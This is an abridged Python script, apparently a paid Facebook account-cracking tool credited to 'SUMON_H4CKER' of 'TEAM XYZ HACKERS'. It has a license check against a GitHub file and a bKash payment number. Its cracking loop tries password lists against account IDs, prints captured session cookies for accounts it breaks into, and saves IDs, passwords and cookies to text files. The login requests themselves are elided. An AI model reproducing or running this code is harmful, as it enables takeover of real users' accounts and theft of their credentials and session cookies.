...
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
      ┌━━━━━━━━━━━━━━━━━ SUMON ━━━━━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   :  SUMON_SUMOM            
               \033[1;91mFACEBOK      :  N T Sumon Hasan               
               \033[1;97mGITHUB       :  SUMON_H4CKER       
               \033[1;91mSTATUS       :   PAID😴            
               \033[1;97mTEAM         :  TEAM XYZ HACKERS                 
               \033[1;91mTOOL VIRSION :  2.10                    
...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Hjdhbv/Project-8/blob/main/Approval.txt').text
    if id in httpCaht:
      ...
      print('BKASH PERSONAL - +8801761426734')
...
def menu():
	...
	if ot == '1':
		os.system('xdg-open https://www.facebook.com/Mahmudulhasansumon143')
		crack_file()
...
def c(uid,pwx,ln):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r%s[SUMON_H4CKER] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
            sys.stdout.flush()
         ...
         #   log_cookies=session.cookies.get_dict().keys()
            ...
            #	botok(uid,ps)
            	...
            	cid = coki[65:80]
            	print('\033[1;92mSUMON-OK[😁]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
            	print('\033[1;92m[\033[1;92m🍪\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('SUMON-OK.txt', 'a').write( cid+' | '+ps+'\n')
            	open('SUMON-coki.txt', 'a').write(coki+'\n')
            	...
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[82:97]
            	print('\33[1;30m(SUMON-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
            	#print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('SUMON-CP.txt', 'a').write( uid+' | '+ps+' \n')
            	cps.append(cid)
            	break
            else:
            	#print (random_header())
